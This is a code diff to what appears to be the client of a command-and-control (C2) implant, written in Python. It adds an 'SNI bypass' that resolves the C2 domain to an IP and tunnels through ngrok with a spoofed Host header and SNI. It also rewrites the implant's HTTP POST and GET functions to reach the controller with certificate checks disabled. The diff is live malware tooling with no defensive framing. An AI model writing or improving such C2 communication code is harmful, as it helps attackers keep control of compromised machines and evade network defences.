@@ -175,6 +175,16 @@ def check_server_health(c2_url=None, timeout=5):
     except Exception as e:
         return False, f"Error: {type(e).__name__}: {e}"
 
+def _resolve_c2_ip(c2_url):
+    """Resolve C2 domain to IP for SNI bypass."""
+    try:
+        from urllib.parse import urlparse
+        host = urlparse(c2_url).netloc.split(':')[0]
+        ips = socket.getaddrinfo(host, 443, socket.AF_INET, socket.SOCK_STREAM)
+        return ips[0][4][0] if ips else None, host
+    except:
+        return None, None
+
 def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
     c2_url = c2_url or C2_URL
     auth_token = auth_token or AUTH_TOKEN
@@ -195,12 +205,36 @@ def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
     else:
         body = payload_str
 
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    opener = build_opener(HTTPSHandler(context=ctx))
-
-    req = Request(f"{c2_url}{path}", data=body.encode(), headers=headers)
+    # Try SNI bypass for ngrok (IP + Host header)
+    c2_ip, c2_host = _resolve_c2_ip(c2_url)
+    
+    if c2_ip and c2_host:
+        # Use IP with SNI hostname for ngrok
+        class SNIHTTPSHandler(HTTPSHandler):
+            def https_open(self, req):
+                return self.do_open(self._connection_factory, req)
+            def _connection_factory(self, host, port, timeout=15):
+                sock = socket.create_connection((c2_ip, 443), timeout=timeout)
+                ctx_wrap = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx_wrap.check_hostname = False
+                ctx_wrap.verify_mode = ssl.CERT_NONE
+                ssock = ctx_wrap.wrap_socket(sock, server_hostname=c2_host)
+                return ssock
+        
+        headers["Host"] = c2_host
+        req = Request(f"https://{c2_ip}{path}", data=body.encode(), headers=headers)
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        opener = build_opener(SNIHTTPSHandler(context=ctx))
+    else:
+        # Fallback to normal URL
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        opener = build_opener(HTTPSHandler(context=ctx))
+        req = Request(f"{c2_url}{path}", data=body.encode(), headers=headers)
+    
     resp = opener.open(req, timeout=15)
     raw = resp.read()
 
@@ -224,12 +258,34 @@ def http_get(path, c2_url=None, auth_token=None, enc_key=None, timeout=10):
     if auth_token:
         headers["X-Auth-Token"] = auth_token
     
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    opener = build_opener(HTTPSHandler(context=ctx))
+    # Try SNI bypass for ngrok
+    c2_ip, c2_host = _resolve_c2_ip(c2_url)
     
-    req = Request(f"{c2_url}{path}", headers=headers)
+    if c2_ip and c2_host:
+        class SNIHTTPSHandler(HTTPSHandler):
+            def https_open(self, req):
+                return self.do_open(self._connection_factory, req)
+            def _connection_factory(self, host, port, timeout=15):
+                sock = socket.create_connection((c2_ip, 443), timeout=timeout)
+                ctx_wrap = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx_wrap.check_hostname = False
+                ctx_wrap.verify_mode = ssl.CERT_NONE
+                ssock = ctx_wrap.wrap_socket(sock, server_hostname=c2_host)
+                return ssock
+        
+        headers["Host"] = c2_host
+        req = Request(f"https://{c2_ip}{path}", headers=headers)
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        opener = build_opener(SNIHTTPSHandler(context=ctx))
+    else:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        opener = build_opener(HTTPSHandler(context=ctx))
+        req = Request(f"{c2_url}{path}", headers=headers)
+    
     resp = opener.open(req, timeout=timeout)
     data = resp.read().decode()
     
